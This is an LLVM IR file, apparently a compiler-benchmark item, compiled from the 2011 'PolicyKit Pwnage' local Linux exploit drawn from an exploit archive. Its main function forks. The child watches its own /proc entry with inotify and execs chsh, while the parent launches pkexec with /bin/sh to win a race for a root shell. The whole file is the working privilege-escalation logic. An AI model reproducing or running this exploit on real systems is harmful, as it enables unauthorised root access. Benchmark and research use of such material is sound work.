; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_17932.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_17932.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [31 x i8] c"=============================\0A\00", align 1
@.str.1 = private unnamed_addr constant [31 x i8] c"=      PolicyKit Pwnage     =\0A\00", align 1
@.str.2 = private unnamed_addr constant [31 x i8] c"=          by zx2c4         =\0A\00", align 1
@.str.3 = private unnamed_addr constant [31 x i8] c"=        Sept 2, 2011       =\0A\00", align 1
@.str.4 = private unnamed_addr constant [32 x i8] c"=============================\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"/proc/%i\00", align 1
@.str.6 = private unnamed_addr constant [41 x i8] c"[+] Configuring inotify for proper pid.\0A\00", align 1
@.str.7 = private unnamed_addr constant [17 x i8] c"[-] inotify_init\00", align 1
@IN_ACCESS = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [14 x i8] c"/usr/bin/chsh\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"chsh\00", align 1
@.str.10 = private unnamed_addr constant [23 x i8] c"[+] Launching pkexec.\0A\00", align 1
@.str.11 = private unnamed_addr constant [16 x i8] c"/usr/bin/pkexec\00", align 1
@.str.12 = private unnamed_addr constant [7 x i8] c"pkexec\00", align 1
@.str.13 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %8 = call i32 @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str, i64 0, i64 0))
  %9 = call i32 @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.1, i64 0, i64 0))
  %10 = call i32 @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.2, i64 0, i64 0))
  %11 = call i32 @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0))
  %12 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.4, i64 0, i64 0))
  %13 = call i64 (...) @fork()
  %14 = icmp ne i64 %13, 0
  br i1 %14, label %15, label %36

15:                                               ; preds = %2
  %16 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %17 = call i32 (...) @getpid()
  %18 = call i32 @sprintf(i8* %16, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0), i32 %17)
  %19 = call i32 @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.6, i64 0, i64 0))
  %20 = call i32 @close(i32 0)
  %21 = call i32 @close(i32 1)
  %22 = call i32 @close(i32 2)
  %23 = call i32 (...) @inotify_init()
  store i32 %23, i32* %6, align 4
  %24 = load i32, i32* %6, align 4
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %28

26:                                               ; preds = %15
  %27 = call i32 @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.7, i64 0, i64 0))
  br label %28

28:                                               ; preds = %26, %15
  %29 = load i32, i32* %6, align 4
  %30 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %31 = load i32, i32* @IN_ACCESS, align 4
  %32 = call i32 @inotify_add_watch(i32 %29, i8* %30, i32 %31)
  %33 = load i32, i32* %6, align 4
  %34 = call i32 @read(i32 %33, i32* null, i32 0)
  %35 = call i32 (i8*, i8*, i8*, ...) @execl(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0), i8* null)
  br label %40

36:                                               ; preds = %2
  %37 = call i32 @sleep(i32 1)
  %38 = call i32 @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.10, i64 0, i64 0))
  %39 = call i32 (i8*, i8*, i8*, ...) @execl(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i64 0, i64 0), i8* null)
  br label %40

40:                                               ; preds = %36, %28
  ret i32 0
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @sprintf(i8*, i8*, i32) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @inotify_init(...) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @inotify_add_watch(i32, i8*, i32) #1

declare dso_local i32 @read(i32, i32*, i32) #1

declare dso_local i32 @execl(i8*, i8*, i8*, ...) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
